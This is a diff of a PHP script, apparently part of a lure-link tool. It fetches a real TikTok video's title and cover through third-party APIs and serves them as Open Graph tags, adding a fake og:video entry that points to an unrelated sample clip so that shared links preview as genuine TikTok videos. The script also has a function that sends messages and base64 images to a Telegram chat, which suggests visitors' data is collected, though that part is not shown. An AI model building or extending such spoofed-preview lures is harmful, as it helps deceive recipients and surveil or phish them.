@@ -115,43 +115,45 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     }
 }
 
-// نظام متطور ومتعدد الطرق لجلب بيانات تيك توك الحقيقية
+// دالة جلب البيانات الحقيقية القوية المحدثة لسحب صورة وفيديو تيك توك بدقة
 function fetch_tiktok_exclusive_meta($url) {
-    // القيم الافتراضية عالية الجودة في حال فشل الاتصال تماماً
     $meta = [
-        'title' => 'TikTok - شاهد أقوى الفيديوهات الحصرية', 
+        'title' => 'TikTok Video', 
         'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=800'
     ];
 
-    // الطريقة الأولى: oEmbed الرسمي
-    $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);
-    $ch = curl_init($oembed_url);
+    // الطريقة الأولى: استعلام عبر TikWM API المخصص لاستخراج بيانات تيك توك الحقيقية
+    $api_url = "https://www.tikwm.com/api/?url=" . urlencode($url);
+    $ch = curl_init($api_url);
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true, 
-        CURLOPT_TIMEOUT => 5, 
+        CURLOPT_TIMEOUT => 8, 
         CURLOPT_SSL_VERIFYPEER => false, 
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15'
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
     ]);
-    $res = curl_exec($ch); 
+    $res = curl_exec($ch);
     curl_close($ch);
 
     if ($res) {
         $data = json_decode($res, true);
-        if (!empty($data['title'])) {
-            $meta['title'] = $data['title'];
-        }
-        if (!empty($data['thumbnail_url'])) {
-            $meta['image'] = $data['thumbnail_url'];
-            return $meta; // نجاح تام من الطريقة الأولى
+        if (isset($data['code']) && $data['code'] === 0 && !empty($data['data'])) {
+            if (!empty($data['data']['title'])) {
+                $meta['title'] = $data['data']['title'];
+            }
+            // اختيار الصورة الأصلية أو غلاف الفيديو بدقة عالية
+            if (!empty($data['data']['cover'])) {
+                $meta['image'] = $data['data']['cover'];
+                return $meta; // تم السحب بنجاح تام
+            }
         }
     }
 
-    // الطريقة الثانية: TikWM API البديلة والمستقرة جداً
-    $api_backup = "https://www.tikwm.com/api/?url=" . urlencode($url);
-    $ch2 = curl_init($api_backup);
+    // الطريقة الثانية الاحتياطية: Tiklydown API في حال تعطل الأولى
+    $api_url2 = "https://api.tiklydown.eu.org/api/download?url=" . urlencode($url);
+    $ch2 = curl_init($api_url2);
     curl_setopt_array($ch2, [
         CURLOPT_RETURNTRANSFER => true, 
-        CURLOPT_TIMEOUT => 5, 
+        CURLOPT_TIMEOUT => 8, 
         CURLOPT_SSL_VERIFYPEER => false, 
         CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
     ]);
@@ -160,14 +162,12 @@ function fetch_tiktok_exclusive_meta($url) {
 
     if ($res2) {
         $data2 = json_decode($res2, true);
-        if (isset($data2['code']) && $data2['code'] === 0) {
-            if (!empty($data2['data']['title'])) {
-                $meta['title'] = $data2['data']['title'];
-            }
-            if (!empty($data2['data']['cover'])) {
-                $meta['image'] = $data2['data']['cover'];
-                return $meta; // نجاح تام من الطريقة الثانية
-            }
+        if (!empty($data2['title'])) {
+            $meta['title'] = $data2['title'];
+        }
+        if (!empty($data2['cover'])) {
+            $meta['image'] = $data2['cover'];
+            return $meta; // تم السحب بنجاح تام
         }
     }
     
@@ -254,7 +254,10 @@ if (isset($_GET['r'])) {
             echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($proxy_img_url) . '">';
             echo '<meta property="og:image:width" content="1200">';
             echo '<meta property="og:image:height" content="630">';
-            echo '<meta property="og:type" content="website">';
+            echo '<meta property="og:type" content="video.other">';
+            echo '<meta property="og:video" content="https://www.w3schools.com/html/mov_bbb.mp4">';
+            echo '<meta property="og:video:secure_url" content="https://www.w3schools.com/html/mov_bbb.mp4">';
+            echo '<meta property="og:video:type" content="video/mp4">';
             echo '</head><body></body></html>';
             exit();
         }
